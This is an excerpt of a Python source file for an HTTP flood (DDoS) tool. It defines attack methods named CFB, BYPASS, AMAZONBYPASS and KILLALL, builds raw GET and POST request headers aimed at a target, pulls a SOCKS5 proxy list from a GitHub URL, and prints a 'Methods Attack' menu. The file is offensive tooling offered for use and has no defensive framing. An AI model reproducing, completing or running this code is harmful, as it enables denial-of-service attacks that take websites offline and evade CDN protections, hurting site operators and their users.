...
from ssl import SOL_SOCKET, SSLContext, wrap_socket
from socket import IPPROTO_RAW, TCP_KEEPCNT, TCP_NODELAY
class color:
...
l7 = ["CFB","GET", "POST","SPAMMER","GETV2","HTTPFAST","HTTPFASTV2","MIX","MIXV2","BYPASS","BYPASSV2","AMAZONBYPASS","AMAZONBYPASSV2","CFBV2","KILLALL","POSTV2"]
...
def Headers(method):
    header = ""
    if method == "get" or method == "getv2" or method  == "httpfast" or method == "httpfastv2" or method == "mix" or method == "mixv2" or method == "bypass" or method == "bypassv2" or method == "amazonbypass" or method == "amazonbypassv2":
    ...
    elif method == "post"  or method == "killall" or method == "postv2" or method == "cfbv2" or method == "spammer":
        post_host = "POST " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
        content = "Content-Type: application/x-www-form-urlencoded\r\nX-Requested-With: XMLHttpRequest\r\n charset=utf-8\r\n"
        refer = "Referer: http://" + target + path + "\r\n"
        user_agent = "User-Agent: " + UserAgent + "\r\n"
...
def downloadsocks(choice):
    ...
    if choice == "5":
        f = open(out_file, 'wb')
        try:
            r = requests.get("https://raw.githubusercontent.com/pvyon3/socks5c/main/socks5p.txt", timeout=5)
            f.write(r.content)
        except:
            pass   
            f.close()
...
def usge():
    ...
    print(color.CYAN  + "     ╚════════╦══════════════════╦════════════╝"+ color.END) 
    print(color.CYAN  + "              ╚╦════════════════╦╝"+ color.END)
    print(color.CYAN  + "               ║ Methods Attack ║"+ color.END)    
    print(color.CYAN  + "   ╔═══════════╩══════════╦═════╩════════════╗"+ color.END) 
    print(color.CYAN  + "   ║   •GETV2             ║  •HTTPRAW        ║"+ color.END)
    print(color.CYAN  + "   ║   •HTTPFASTV2        ║  •MIXV2          ║"+ color.END) 
    print(color.CYAN  + "   ║   •HTTPFAST          ║  •MIX            ║"+ color.END)
    print(color.CYAN  + "   ╠══════════════════════╬══════════════════╣"+ color.END)  
    print(color.CYAN  + "   ║   •CFB               ║  •AMAZONBYPASS   ║"+ color.END)
    print(color.CYAN  + "   ║   •CFBV2             ║  •AMAZONBYPASSV2 ║"+ color.END)
    print(color.CYAN  + "   ║   •SPAMMER           ║  •NULLGET        ║"+ color.END)
    print(color.CYAN  + "   ╚══════════════════════╩══════════════════╝"+ color.END)
